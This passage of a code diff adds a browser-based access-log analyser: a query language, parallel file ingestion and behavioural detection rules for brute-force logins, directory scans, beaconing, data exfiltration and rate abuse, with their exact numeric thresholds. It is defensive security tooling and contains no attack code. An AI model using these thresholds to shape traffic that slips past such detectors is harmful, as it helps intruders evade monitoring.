+    this.flags = new Uint32Array(cap); this.file = new Uint16Array(cap);
+    this.raw.clear(); this.unparsed.length = 0;
+  },
+  grow(need){
+    if (this.cap >= need) return;
+    let cap = Math.max(this.cap || 65536, 65536);
+    while (cap < need) cap = Math.ceil(cap * 1.8);
+    const g = (Type, old) => { const a = new Type(cap); a.set(old.subarray(0, this.n)); return a; };
+    this.ts = g(Float64Array, this.ts); this.status = g(Uint16Array, this.status);
+    this.bytes = g(Float64Array, this.bytes); this.method = g(Uint8Array, this.method);
+    this.ip = g(Uint32Array, this.ip); this.url = g(Uint32Array, this.url);
+    this.ua = g(Uint32Array, this.ua); this.ref = g(Uint32Array, this.ref);
+    this.flags = g(Uint32Array, this.flags); this.file = g(Uint16Array, this.file);
+    this.cap = cap;
+  },
+  bytesUsed(){ return this.cap * (8+2+8+1+4+4+4+4+4+2); }
+};
+Store.init(1 << 16);
+
+/* --------------------------------------------------------------- format --- */
+const nf = new Intl.NumberFormat("en-US");
+const fmtInt = v => nf.format(Math.round(v));
+function fmtBytes(b){
+  if (!isFinite(b) || b <= 0) return "0 B";
+  const u = ["B","KB","MB","GB","TB","PB"]; let i = 0;
+  while (b >= 1024 && i < u.length - 1){ b /= 1024; i++; }
+  return (b >= 100 || i === 0 ? b.toFixed(0) : b.toFixed(1)) + " " + u[i];
+}
+function fmtTime(ms){
+  if (!ms) return "—";
+  const d = new Date(ms);
+  const p = n => String(n).padStart(2, "0");
+  return d.getUTCFullYear() + "-" + p(d.getUTCMonth()+1) + "-" + p(d.getUTCDate()) + " " +
+         p(d.getUTCHours()) + ":" + p(d.getUTCMinutes()) + ":" + p(d.getUTCSeconds());
+}
+function fmtDur(ms){
+  if (!isFinite(ms) || ms <= 0) return "—";
+  const s = ms/1000;
+  if (s < 90) return s.toFixed(1) + "s";
+  if (s < 5400) return (s/60).toFixed(1) + "m";
+  if (s < 172800) return (s/3600).toFixed(1) + "h";
+  return (s/86400).toFixed(1) + "d";
+}
+function esc(s){ return String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c])); }
+function statusClass(s){ return s >= 500 ? "s5" : s >= 400 ? "s4" : s >= 300 ? "s3" : s >= 200 ? "s2" : "s0"; }
+
+/* --------------------------------------------------------------- ip math -- */
+function ipToInt(s){
+  const p = s.split(".");
+  if (p.length !== 4) return -1;
+  let v = 0;
+  for (let i = 0; i < 4; i++){
+    const n = +p[i];
+    if (!(n >= 0 && n <= 255) || p[i] === "") return -1;
+    v = (v * 256) + n;
+  }
+  return v;
+}
+function parseCIDR(s){
+  const i = s.indexOf("/");
+  if (i < 0) return null;
+  const base = ipToInt(s.slice(0, i)), bits = +s.slice(i+1);
+  if (base < 0 || !(bits >= 0 && bits <= 32)) return null;
+  const size = Math.pow(2, 32 - bits);
+  const net = Math.floor(base / size) * size;
+  return { lo:net, hi:net + size - 1 };
+}
+
+/* ============================================================================
+   QUERY LANGUAGE
+   status>=400 AND ip=10.0.0.0/8 AND NOT ua~"bot" AND (url:admin OR flag:sqli)
+   Compiles to dictionary masks: string predicates are evaluated once per unique
+   value, then every row is a single array lookup.
+   ========================================================================== */
+const FIELD_ALIASES = {
+  ip:"ip", src:"ip", client:"ip", host:"ip",
+  url:"url", uri:"url", path:"url", endpoint:"url", request:"url", msg:"url", message:"url",
+  ua:"ua", agent:"ua", useragent:"ua", "user_agent":"ua",
+  ref:"ref", referer:"ref", referrer:"ref",
+  status:"status", code:"status",
+  bytes:"bytes", size:"bytes",
+  method:"method", verb:"method",
+  time:"time", ts:"time", date:"time",
+  flag:"flag", tag:"flag", rule:"flag", detection:"flag",
+  file:"file", source:"file",
+  text:"text", any:"text", raw:"text"
+};
+
+function tokenizeQuery(src){
+  const out = []; let i = 0;
+  const isIdent = c => /[A-Za-z0-9_.\-*/%$@]/.test(c);
+  while (i < src.length){
+    const c = src[i];
+    if (/\s/.test(c)){ i++; continue; }
+    if (c === "(" || c === ")"){ out.push({ k:c, p:i }); i++; continue; }
+    if (c === '"' || c === "'"){
+      const q = c; let j = i + 1, s = "";
+      while (j < src.length && src[j] !== q){ if (src[j] === "\\") j++; s += src[j]; j++; }
+      if (j >= src.length) throw { msg:"unterminated string", p:i };
+      out.push({ k:"str", v:s, p:i }); i = j + 1; continue;
+    }
+    const two = src.substr(i, 2);
+    if (two === ">=" || two === "<=" || two === "!=" || two === "=~"){ out.push({ k:"op", v:two === "=~" ? "~" : two, p:i }); i += 2; continue; }
+    if ("=<>:~!".includes(c)){ out.push({ k:"op", v:c, p:i }); i++; continue; }
+    if (isIdent(c)){
+      /* A colon ends the word when what precedes it is a field name
+         (`url:admin`), and stays inside it otherwise (`09:30:00`). */
+      let j = i;
+      while (j < src.length){
+        const ch = src[j];
+        if (ch === ":"){
+          if (FIELD_ALIASES[src.slice(i, j).toLowerCase()]) break;
+          if (!/\d/.test(src[j + 1] || "")) break;
+          j++; continue;
+        }
+        if (!isIdent(ch)) break;
+        j++;
+      }
+      const w = src.slice(i, j);
+      const U = w.toUpperCase();
+      if (U === "AND" || U === "OR" || U === "NOT") out.push({ k:U, p:i });
+      else out.push({ k:"word", v:w, p:i });
+      i = j; continue;
+    }
+    throw { msg:"unexpected character " + JSON.stringify(c), p:i };
+  }
+  return out;
+}
+
+function compileQuery(src){
+  const toks = tokenizeQuery(src);
+  let pos = 0;
+  const peek = () => toks[pos];
+  const eat = k => { const t = toks[pos]; if (t && t.k === k){ pos++; return t; } return null; };
+
+  const Expr = () => {
+    let left = And();
+    while (peek() && peek().k === "OR"){ pos++; const right = And(); const a = left, b = right; left = r => a(r) || b(r); }
+    return left;
+  };
+  const And = () => {
+    let left = Unary();
+    for (;;){
+      const t = peek();
+      if (!t) break;
+      if (t.k === "AND"){ pos++; }
+      else if (t.k === "OR" || t.k === ")") break;
+      const right = Unary();
+      const a = left, b = right; left = r => a(r) && b(r);
+      if (!peek()) break;
+    }
+    return left;
+  };
+  const Unary = () => {
+    if (peek() && (peek().k === "NOT" || (peek().k === "op" && peek().v === "!"))){ pos++; const inner = Unary(); return r => !inner(r); }
+    return Primary();
+  };
+  const Primary = () => {
+    const t = peek();
+    if (!t) throw { msg:"unexpected end of query", p:src.length };
+    if (t.k === "("){ pos++; const e = Expr(); if (!eat(")")) throw { msg:"missing )", p:t.p }; return e; }
+    if (t.k === "word" || t.k === "str"){
+      const nx = toks[pos+1];
+      if (t.k === "word" && nx && nx.k === "op"){
+        pos += 2;
+        const vt = peek();
+        if (!vt || (vt.k !== "word" && vt.k !== "str")) throw { msg:"missing value after " + nx.v, p:nx.p };
+        pos++;
+        return leaf(t.v, nx.v, vt.v, t.p);
+      }
+      pos++;
+      return leaf("text", ":", t.v, t.p);
+    }
+    throw { msg:"unexpected token", p:t.p };
+  };
+
+  const e = Expr();
+  if (pos < toks.length) throw { msg:"unparsed input at position " + toks[pos].p, p:toks[pos].p };
+  return e;
+}
+
+/* --- leaf compilation: builds a dictionary mask where possible ------------- */
+function dictMask(dict, test){
+  const arr = dict.arr, m = new Uint8Array(arr.length);
+  for (let i = 0; i < arr.length; i++) if (test(arr[i], i)) m[i] = 1;
+  return m;
+}
+function leaf(fieldRaw, op, valRaw, at){
+  const f = FIELD_ALIASES[fieldRaw.toLowerCase()];
+  if (!f) throw { msg:"unknown field " + JSON.stringify(fieldRaw), p:at };
+  const val = String(valRaw);
+  const S = Store;
+
+  /* numeric-ish fields ---------------------------------------------------- */
+  if (f === "status" || f === "bytes"){
+    const col = f === "status" ? S.status : S.bytes;
+    const m = /^([1-5])xx$/i.exec(val);
+    if (f === "status" && m){
+      const lo = +m[1] * 100, hi = lo + 99;
+      if (op === "=" || op === ":") return r => col[r] >= lo && col[r] <= hi;
+      if (op === "!=") return r => !(col[r] >= lo && col[r] <= hi);
+    }
+    const rng = /^(\d+)\s*-\s*(\d+)$/.exec(val);
+    if (rng){
+      const lo = +rng[1], hi = +rng[2];
+      if (op === "=" || op === ":") return r => col[r] >= lo && col[r] <= hi;
+      if (op === "!=") return r => !(col[r] >= lo && col[r] <= hi);
+    }
+    const num = parseSize(val);
+    if (!isFinite(num)) throw { msg:"expected a number for " + f, p:at };
+    switch (op){
+      case "=": case ":": return r => col[r] === num;
+      case "!=": return r => col[r] !== num;
+      case ">": return r => col[r] > num;
+      case ">=": return r => col[r] >= num;
+      case "<": return r => col[r] < num;
+      case "<=": return r => col[r] <= num;
+      default: throw { msg:"operator " + op + " not valid for " + f, p:at };
+    }
+  }
+
+  /* time ------------------------------------------------------------------ */
+  if (f === "time"){
+    const t = parseWhen(val);
+    if (!isFinite(t)) throw { msg:"cannot read time " + JSON.stringify(val), p:at };
+    const col = S.ts;
+    switch (op){
+      case ">": case ">=": return r => col[r] >= t;
+      case "<": case "<=": return r => col[r] <= t;
+      case "=": case ":": { const end = t + 86400000; return r => col[r] >= t && col[r] < end; }
+      default: throw { msg:"use > or < with time", p:at };
+    }
+  }
+
+  /* method ---------------------------------------------------------------- */
+  if (f === "method"){
+    const idx = METHODS.indexOf(val.toUpperCase());
+    const col = S.method;
+    if (idx < 0) return () => false;
+    return op === "!=" ? (r => col[r] !== idx) : (r => col[r] === idx);
+  }
+
+  /* detections ------------------------------------------------------------ */
+  if (f === "flag"){
+    const key = val.toLowerCase();
+    let mask = 0;
+    if (key === "any" || key === "*") RULES.forEach(r => { if (r.sev !== "low") mask |= (1 << r.bit); });
+    else if (SEV_ORDER[key] !== undefined) RULES.forEach(r => { if (r.sev === key) mask |= (1 << r.bit); });
+    else {
+      const hit = RULES.filter(r => r.id === key || r.id.includes(key) || r.label.toLowerCase().includes(key));
+      if (!hit.length) throw { msg:"unknown detection " + JSON.stringify(val), p:at };
+      hit.forEach(r => mask |= (1 << r.bit));
+    }
+    const col = S.flags;
+    return op === "!=" ? (r => (col[r] & mask) === 0) : (r => (col[r] & mask) !== 0);
+  }
+
+  /* file ------------------------------------------------------------------ */
+  if (f === "file"){
+    const needle = val.toLowerCase();
+    const set = new Set();
+    Files.list.forEach((fl, i) => { if (fl.name.toLowerCase().includes(needle)) set.add(i); });
+    const col = S.file;
+    return op === "!=" ? (r => !set.has(col[r])) : (r => set.has(col[r]));
+  }
+
+  /* free text across every string column ---------------------------------- */
+  if (f === "text"){
+    const parts = ["url","ua","ip","ref"].map(k => leaf(k, op === "=" ? ":" : op, val, at));
+    return r => parts[0](r) || parts[1](r) || parts[2](r) || parts[3](r);
+  }
+
+  /* dictionary-encoded string fields -------------------------------------- */
+  const dict = D[f], col = S[f];
+  let test;
+  if (op === "~"){
+    let re; try { re = new RegExp(val, "i"); } catch (e){ throw { msg:"bad regex: " + e.message, p:at }; }
+    test = s => re.test(s);
+  } else if (f === "ip" && (op === "=" || op === ":" || op === "!=") && val.includes("/")){
+    const cidr = parseCIDR(val);
+    if (!cidr) throw { msg:"bad CIDR " + JSON.stringify(val), p:at };
+    test = s => { const v = ipToInt(s); return v >= 0 && v >= cidr.lo && v <= cidr.hi; };
+  } else if (op === "=" || op === "!="){
+    const lv = val.toLowerCase();
+    if (lv.includes("*")){
+      const re = new RegExp("^" + lv.split("*").map(x => x.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$", "i");
+      test = s => re.test(s);
+    } else test = (s, i) => lowerOf(dict)[i] === lv;
+  } else if (op === ":"){
+    const lv = val.toLowerCase();
+    test = (s, i) => lowerOf(dict)[i].includes(lv);
+  } else {
+    throw { msg:"operator " + op + " not valid for " + f, p:at };
+  }
+  const mask = dictMask(dict, test);
+  return op === "!=" ? (r => mask[col[r]] === 0) : (r => mask[col[r]] === 1);
+}
+
+function parseSize(v){
+  const m = /^([\d.]+)\s*(k|kb|m|mb|g|gb)?$/i.exec(String(v).trim());
+  if (!m) return NaN;
+  const mult = { k:1e3, kb:1024, m:1e6, mb:1048576, g:1e9, gb:1073741824 }[(m[2]||"").toLowerCase()] || 1;
+  return parseFloat(m[1]) * mult;
+}
+function parseWhen(v){
+  const rel = /^-(\d+)([smhd])$/i.exec(v);
+  if (rel){
+    const mult = { s:1000, m:60000, h:3600000, d:86400000 }[rel[2].toLowerCase()];
+    const base = Analytics.maxTs || Date.now();
+    return base - (+rel[1]) * mult;
+  }
+  if (/^\d{10}$/.test(v)) return +v * 1000;
+  if (/^\d{13}$/.test(v)) return +v;
+  const t = Date.parse(v.length === 10 ? v + "T00:00:00Z" : v);
+  return t;
+}
+</script>
+<script>
+"use strict";
+/* ============================================================================
+   INGESTION
+   One worker per in-flight file, pool bounded by hardware concurrency.
+   Files are handed to the worker as File handles — the main thread never
+   touches the bytes, so a 4 GB log costs the UI nothing but progress ticks.
+   ========================================================================== */
+const Files = { list:[] };
+
+const Ingest = {
+  pool:[], idle:[], queue:[], inflight:0,
+  max: Math.max(1, Math.min(6, (navigator.hardwareConcurrency || 4) - 1)),
+  t0:0, bytes:0, lines:0, running:false, useInline:false,
+
+  workerSource(){ return document.getElementById("workerSrc").textContent; },
+
+  spawn(){
+    const initMsg = {
+      cmd:"init",
+      bits:BITS,
+      rules: RULES.filter(r => r.pattern).map(r => ({ bit:r.bit, pattern:r.pattern, flags:r.flags || "i", target:r.target || "url" }))
+    };
+    if (!this.useInline){
+      try {
+        const url = URL.createObjectURL(new Blob([this.workerSource()], { type:"text/javascript" }));
+        const w = new Worker(url);
+        w.onerror = e => { console.warn("worker error", e.message); };
+        w.postMessage(initMsg);
+        return w;
+      } catch (e){
+        this.useInline = true;
+        toast("Workers unavailable here — parsing on the main thread instead.", true);
+      }
+    }
+    const w = inlineWorker(this.workerSource());
+    w.postMessage(initMsg);
+    return w;
+  },
+
+  add(fileList){
+    const files = Array.from(fileList).filter(f => f && f.size >= 0);
+    if (!files.length) return;
+    if (!this.running){ this.t0 = performance.now(); this.bytes = 0; this.lines = 0; }
+    this.running = true;
+    for (const f of files){
+      const id = Files.list.length;
+      const rec = { id, name:f.name, size:f.size, file:f, format:"—", lines:0, parsed:0, skipped:0,
+                    bytes:0, state:"queued", maps:{ ip:[], url:[], ua:[], ref:[] } };
+      Files.list.push(rec);
+      UI.addQueueRow(rec);
+      this.queue.push(rec);
+    }
+    UI.showIngestUI();
+    this.pump();
+  },
+
+  pump(){
+    while (this.queue.length && this.inflight < this.max){
+      const rec = this.queue.shift();
+      const w = this.idle.pop() || this.spawn();
+      this.inflight++;
+      rec.state = "running";
+      UI.updateQueueRow(rec);
+      w.onmessage = e => this.onMessage(e.data, w, rec);
+      w.postMessage({ cmd:"parse", fileId:rec.id, file:rec.file });
+    }
+    if (!this.queue.length && this.inflight === 0 && this.running){ this.finish(); }
+  },
+
+  onMessage(m, w, rec){
+    switch (m.t){
+      case "ready": break;
+      case "fmt":
+        rec.format = m.format; rec.confidence = m.confidence;
+        UI.updateQueueRow(rec);
+        break;
+      case "progress":
+        this.bytes += (m.bytes - rec.bytes);
+        this.lines += (m.lines - rec.lines);
+        rec.bytes = m.bytes; rec.lines = m.lines;
+        UI.updateQueueRow(rec);
+        UI.liveStats();
+        break;
+      case "batch":
+        this.merge(m, rec);
+        UI.liveStats();
+        break;
+      case "done":
+        this.bytes += (m.bytes - rec.bytes); this.lines += (m.lines - rec.lines);
+        rec.bytes = m.bytes; rec.lines = m.lines; rec.parsed = m.parsed; rec.skipped = m.skipped;
+        rec.format = m.format; rec.state = "done"; rec.file = null;
+        UI.updateQueueRow(rec);
+        this.inflight--; this.idle.push(w);
+        this.pump();
+        break;
+      case "error":
+        rec.state = "error"; rec.error = m.message;
+        UI.updateQueueRow(rec);
+        toast("Could not read " + rec.name + ": " + m.message, true);
+        this.inflight--; this.idle.push(w);
+        this.pump();
+        break;
+    }
+  },
+
+  /* dictionary-delta merge: worker-local ids -> global ids, columns appended */
+  merge(m, rec){
+    const maps = rec.maps, S = Store;
+    for (const k of ["ip","url","ua","ref"]){
+      const delta = m.dict[k], target = maps[k], dict = D[k];
+      for (let i = 0; i < delta.length; i++) target.push(intern(dict, delta[i]));
+    }
+    const base = S.n, n = m.n;
+    S.grow(base + n);
+    S.ts.set(m.ts, base); S.status.set(m.status, base); S.bytes.set(m.bytes, base);
+    S.method.set(m.method, base); S.flags.set(m.flags, base);
+    const mi = maps.ip, mu = maps.url, ma = maps.ua, mr = maps.ref;
+    const cip = S.ip, cur = S.url, cua = S.ua, cre = S.ref, cf = S.file;
+    for (let i = 0; i < n; i++){
+      const g = base + i;
+      cip[g] = mi[m.ip[i]]; cur[g] = mu[m.url[i]];
+      cua[g] = ma[m.ua[i]]; cre[g] = mr[m.ref[i]];
+      cf[g] = rec.id;
+    }
+    S.n = base + n;
+    for (let i = 0; i < m.rawIdx.length; i++){
+      const ri = m.rawIdx[i];
+      if (ri < 0){ if (S.unparsed.length < 200) S.unparsed.push({ file:rec.name, line:m.rawStr[i] }); }
+      else if (S.raw.size < 400000) S.raw.set(base + ri, m.rawStr[i]);
+    }
+  },
+
+  finish(){
+    this.running = false;
+    for (const w of this.idle){ try { w.terminate(); } catch (e){} }
+    this.idle.length = 0;
+    if (!Store.n){ toast("Nothing parsed — no recognised log lines in those files.", true); return; }
+    const t = performance.now() - this.t0;
+    Analytics.run();
+    UI.renderAll();
+    toast(fmtInt(Store.n) + " events from " + Files.list.length + " file(s) in " + (t/1000).toFixed(1) + "s");
+  }
+};
+
+/* ------------------------------------------------- main-thread worker shim */
+/* Used when Worker construction is blocked (some file:// and sandbox modes).
+   Same source, same protocol — it just runs cooperatively on this thread. */
+function inlineWorker(src){
+  const host = { onmessage:null, terminate(){} };
+  const scope = { onmessage:null };
+  scope.postMessage = msg => { if (host.onmessage) setTimeout(() => host.onmessage({ data:msg }), 0); };
+  host.postMessage = msg => { if (scope.onmessage) setTimeout(() => scope.onmessage({ data:msg }), 0); };
+  const DS = typeof DecompressionStream !== "undefined" ? DecompressionStream : undefined;
+  // eslint-disable-next-line no-new-func
+  const fn = new Function("self", "postMessage", "DecompressionStream", src + "\n//# sourceURL=vehcs-inline-parser.js");
+  fn(scope, scope.postMessage, DS);
+  return host;
+}
+
+/* ============================================================================
+   BEHAVIOURAL ANALYTICS
+   One linear pass builds per-source profiles; a second pass stamps behavioural
+   detections back onto the rows so they are filterable like any signature.
+   ========================================================================== */
+const Analytics = {
+  minTs:0, maxTs:0, spanMs:0,
+  ruleCount:new Float64Array(32), ruleSources:[], ruleSample:new Int32Array(32),
+  actors:[], ipStats:null, totalBytes:0, statusCounts:null, parseErrors:0,
+
+  run(){
+    const S = Store, n = S.n;
+    const t0 = performance.now();
+    this.ruleCount = new Float64Array(32);
+    this.ruleSources = Array.from({ length:32 }, () => new Set());
+    this.ruleSample = new Int32Array(32).fill(-1);
+    this.statusCounts = new Float64Array(6);
+    this.totalBytes = 0;
+
+    /* login-ish endpoints, resolved once per unique URL. Matched against the
+       path only — an injected payload full of "password" is not a login. */
+    const urlArr = D.url.arr, isLogin = new Uint8Array(urlArr.length);
+    const loginRe = /(login|signin|sign-in|auth|session|token|oauth|sso|account|credential)/i;
+    for (let i = 0; i < urlArr.length; i++){
+      const u = urlArr[i], qi = u.indexOf("?");
+      if (loginRe.test(qi < 0 ? u : u.slice(0, qi))) isLogin[i] = 1;
+    }
+
+    const stats = new Map();
+    let minTs = Infinity, maxTs = 0;
+
+    for (let r = 0; r < n; r++){
+      const ts = S.ts[r], ip = S.ip[r], st = S.status[r], by = S.bytes[r], fl = S.flags[r];
+      if (ts > 0){ if (ts < minTs) minTs = ts; if (ts > maxTs) maxTs = ts; }
+      this.totalBytes += by;
+      this.statusCounts[st >= 100 ? Math.min(5, Math.floor(st / 100)) : 0]++;
+
+      if (fl){
+        for (let b = 0; b < 32; b++){
+          if (fl & (1 << b)){
+            this.ruleCount[b]++;
+            if (this.ruleSample[b] < 0) this.ruleSample[b] = r;
+            const set = this.ruleSources[b];
+            if (set.size < 2000) set.add(ip);
+          }
+        }
+      }
+
+      let s = stats.get(ip);
+      if (s === undefined){
+        s = { ip, n:0, e4:0, e5:0, bytes:0, first:ts || 0, last:0, lastTs:0,
+              dN:0, dSum:0, dSq:0, minute:-1, mCount:0, mMax:0,
+              nf:new Set(), authFail:0, loginHits:0, uas:new Set(), sig:0, score:0, reasons:[] };
+        stats.set(ip, s);
+      }
+      s.n++; s.bytes += by; s.sig |= fl;
+      if (st >= 400 && st < 500) s.e4++;
+      else if (st >= 500) s.e5++;
+      if (st === 404 && s.nf.size < 600) s.nf.add(S.url[r]);
+      if (isLogin[S.url[r]]){
+        s.loginHits++;
+        if (st === 401 || st === 403 || st === 407 || st === 429) s.authFail++;
+      }
+      if (s.uas.size < 12) s.uas.add(S.ua[r]);
+      if (ts > 0){
+        if (s.lastTs){
+          const d = ts - s.lastTs;
+          if (d > 0 && d < 6 * 3600000){ s.dN++; s.dSum += d; s.dSq += d * d; }
+        }
+        s.lastTs = ts;
+        if (ts > s.last) s.last = ts;
+        if (!s.first || ts < s.first) s.first = ts;
+        const min = Math.floor(ts / 60000);
+        if (min !== s.minute){ if (s.mCount > s.mMax) s.mMax = s.mCount; s.minute = min; s.mCount = 1; }
+        else s.mCount++;
+      }
+    }
+
+    this.minTs = minTs === Infinity ? 0 : minTs;
+    this.maxTs = maxTs;
+    this.spanMs = Math.max(0, maxTs - this.minTs);
+
+    /* ---- cadence pass -----------------------------------------------------
+       Inter-arrival statistics only mean something on sorted timestamps, and a
+       log merged from several nodes is never perfectly ordered. Sample the
+       busiest sources, sort their arrivals, and measure the real distribution:
+       a low coefficient of variation is machine cadence, not a human. */
+    const CAND = 150, CAP = 20000;
+    const candidates = [];
+    stats.forEach(s => { if (s.n >= 20) candidates.push(s); });
+    candidates.sort((a, b) => b.n - a.n);
+    const boxes = new Map();
+    candidates.slice(0, CAND).forEach(s => boxes.set(s.ip, { a:new Float64Array(Math.min(s.n, CAP)), k:0 }));
+    if (boxes.size){
+      for (let r = 0; r < n; r++){
+        const box = boxes.get(S.ip[r]);
+        if (!box || box.k >= box.a.length) continue;
+        const t = S.ts[r];
+        if (t) box.a[box.k++] = t;
+      }
+      boxes.forEach((box, ipId) => {
+        const arr = box.a.subarray(0, box.k);
+        if (arr.length < 20) return;
+        arr.sort();
+        let sum = 0, sq = 0, c = 0, j = 0, peak = 0;
+        for (let i = 0; i < arr.length; i++){
+          if (i){ const d = arr[i] - arr[i-1]; if (d > 0 && d < 6 * 3600000){ sum += d; sq += d * d; c++; } }
+          while (arr[i] - arr[j] > 60000) j++;
+          if (i - j + 1 > peak) peak = i - j + 1;
+        }
+        const s = stats.get(ipId);
+        s.dN = c; s.dSum = sum; s.dSq = sq;
+        if (peak > s.mMax) s.mMax = peak;
+        s.sampled = arr.length < s.n;
+      });
+    }
+
+    /* population baseline for volume outliers (median absolute deviation) */
+    const byteArr = [];
+    stats.forEach(s => { if (s.mCount > s.mMax) s.mMax = s.mCount; if (s.bytes > 0) byteArr.push(s.bytes); });
+    byteArr.sort((a, b) => a - b);
+    const median = byteArr.length ? byteArr[byteArr.length >> 1] : 0;
+    const mad = byteArr.length ? byteArr[Math.min(byteArr.length - 1, Math.floor(byteArr.length * 0.75))] : 0;
+
+    /* behavioural rules --------------------------------------------------- */
+    const behaviour = new Uint32Array(D.ip.arr.length);
+    const W = { brute_force:32, beaconing:28, dir_scan:22, exfil:24, rate_abuse:14, error_burst:10 };
+    const actors = [];
+
+    stats.forEach(s => {
+      let bits = 0; const reasons = [];
+      if (s.authFail >= 15 && s.loginHits >= 15){
+        bits |= 1 << BITS.brute_force; reasons.push({ id:"brute_force", detail:fmtInt(s.authFail) + " rejected auth attempts" });
+      }
+      if (s.nf.size >= 25){
+        bits |= 1 << BITS.dir_scan;
+        reasons.push({ id:"dir_scan", detail:fmtInt(s.nf.size) + (s.nf.size >= 600 ? "+" : "") + " distinct 404 paths" });
+      }
+      if (s.dN >= 20){
+        const mean = s.dSum / s.dN;
+        const varn = Math.max(0, s.dSq / s.dN - mean * mean);
+        const cv = Math.sqrt(varn) / (mean || 1);
+        if (cv < 0.18 && mean > 2000 && mean < 3600000){
+          bits |= 1 << BITS.beaconing;
+          reasons.push({ id:"beaconing", detail:"interval " + fmtDur(mean) + " ±" + (cv * 100).toFixed(0) + "%" });
+        }
+      }
+      if (s.bytes > Math.max(50 * 1048576, median * 25) && median > 0){
+        bits |= 1 << BITS.exfil; reasons.push({ id:"exfil", detail:fmtBytes(s.bytes) + " transferred" });
+      }
+      if (s.mMax >= 300){
+        bits |= 1 << BITS.rate_abuse; reasons.push({ id:"rate_abuse", detail:fmtInt(s.mMax) + " req/min peak" });
+      }
+      if (s.e5 >= 20 && s.n >= 100 && s.e5 / s.n > 0.25){
+        bits |= 1 << BITS.error_burst; reasons.push({ id:"error_burst", detail:fmtInt(s.e5) + " server errors (" + Math.round(100 * s.e5 / s.n) + "%)" });
+      }
+      behaviour[s.ip] = bits;
+
+      /* composite risk = what they sent (signatures) + how they behaved
+         (behavioural rules) + how much of it there was (impact). Signature
+         breadth is damped so a probe that trips ten rules once does not
+         outrank a source that is actively succeeding. */
+      let sig = 0;
+      const sigHits = [];
+      for (let b = 0; b < 32; b++){
+        if (s.sig & (1 << b)){
+          const rule = RULE_BY_BIT[b];
+          if (!rule || rule.behavioural) continue;
+          sigHits.push(rule);
+          sig += rule.sev === "critical" ? 26 : rule.sev === "high" ? 15 : rule.sev === "medium" ? 6 : 1;
+        }
+      }
+      let score = Math.min(55, sig * 0.6);
+      for (const rr of reasons) score += W[rr.id] || 0;
+      score += Math.min(12, Math.log10(1 + s.n) * 4);
+      if (s.e4 / Math.max(1, s.n) > 0.6 && s.n >= 30) score += 6;
+      score = Math.min(100, Math.round(score));
+      s.score = score; s.reasons = reasons; s.sigHits = sigHits;
+      if (score > 0) actors.push(s);
+    });
+
+    /* stamp behavioural bits back onto rows, then count them like any rule */
+    for (let b = 23; b <= 28; b++){ this.ruleCount[b] = 0; this.ruleSources[b] = new Set(); this.ruleSample[b] = -1; }
+    for (let r = 0; r < n; r++){
+      const add = behaviour[S.ip[r]];
+      if (!add) continue;
+      const fl = (S.flags[r] |= add);
+      for (let b = 23; b <= 28; b++){
+        if (fl & (1 << b)){
+          this.ruleCount[b]++;
+          if (this.ruleSample[b] < 0) this.ruleSample[b] = r;
+          const set = this.ruleSources[b];
+          if (set.size < 2000) set.add(S.ip[r]);
+        }
+      }
+    }
+
+    actors.sort((a, b) => b.score - a.score || b.n - a.n);
+    this.actors = actors.slice(0, 60);
+    this.ipStats = stats;
+    this.spikes = this.findSpikes();
+    this.elapsed = performance.now() - t0;
+  },
+
+  /* Service-level anomaly: a 5xx cluster that no single source explains.
+     Median + MAD rather than mean + sigma, because one huge outage otherwise
+     inflates the baseline it is supposed to stand out from. */
+  findSpikes(){
+    const S = Store, n = S.n;
+    if (!this.spanMs || n < 200) return [];
+    const bucket = Math.max(60000, Math.ceil(this.spanMs / 600 / 1000) * 1000);
+    const count = Math.min(5000, Math.floor(this.spanMs / bucket) + 1);
+    const e5 = new Float64Array(count), all = new Float64Array(count);
+    for (let r = 0; r < n; r++){
+      const t = S.ts[r];
+      if (!t) continue;
+      let i = Math.floor((t - this.minTs) / bucket);
+      if (i < 0) i = 0; else if (i >= count) i = count - 1;
+      all[i]++;
+      if (S.status[r] >= 500) e5[i]++;
+    }
+    const sorted = Array.from(e5).sort((a, b) => a - b);
+    const med = sorted[sorted.length >> 1] || 0;
+    const dev = sorted.map(v => Math.abs(v - med)).sort((a, b) => a - b);
+    const mad = (dev[dev.length >> 1] || 0) * 1.4826;
+    const thresh = Math.max(med + 6 * (mad || 1), med * 3, 10);
+    const windows = [];
+    let cur = null;
+    for (let i = 0; i < count; i++){
+      if (e5[i] >= thresh){
+        if (!cur) cur = { i0:i, i1:i, count:e5[i], total:all[i] };
+        else { cur.i1 = i; cur.count += e5[i]; cur.total += all[i]; }
+      } else if (cur){ windows.push(cur); cur = null; }
+    }
+    if (cur) windows.push(cur);
+    return windows.map(w => ({
+      from:this.minTs + w.i0 * bucket, to:this.minTs + (w.i1 + 1) * bucket,
+      count:w.count, total:w.total, baseline:med, bucket
+    })).sort((a, b) => b.count - a.count).slice(0, 6);
+  },
+
+  bucketFor(span, target){
+    const steps = [1e3, 5e3, 15e3, 60e3, 300e3, 900e3, 3600e3, 21600e3, 86400e3, 604800e3];
+    for (const s of steps) if (span / s <= target) return s;
+    return steps[steps.length - 1];
+  }
+};
+
+/* ============================================================================
+   DEMO DATASET
+   Synthesised access log with a realistic baseline and six planted incidents,
+   so the detection stack can be demonstrated without shipping customer data.
+   ========================================================================== */
+function buildDemoLog(){
+  const out = [];
+  const MONTHS = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+  const stamp = t => {
+    const d = new Date(t), p = n => String(n).padStart(2, "0");
+    return p(d.getUTCDate()) + "/" + MONTHS[d.getUTCMonth()] + "/" + d.getUTCFullYear() + ":" +
+           p(d.getUTCHours()) + ":" + p(d.getUTCMinutes()) + ":" + p(d.getUTCSeconds()) + " +0000";
+  };
+  const line = (ip, t, method, url, status, bytes, ref, ua) =>
+    ip + ' - - [' + stamp(t) + '] "' + method + " " + url + ' HTTP/1.1" ' + status + " " + bytes + ' "' + ref + '" "' + ua + '"';
+
+  const UA = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
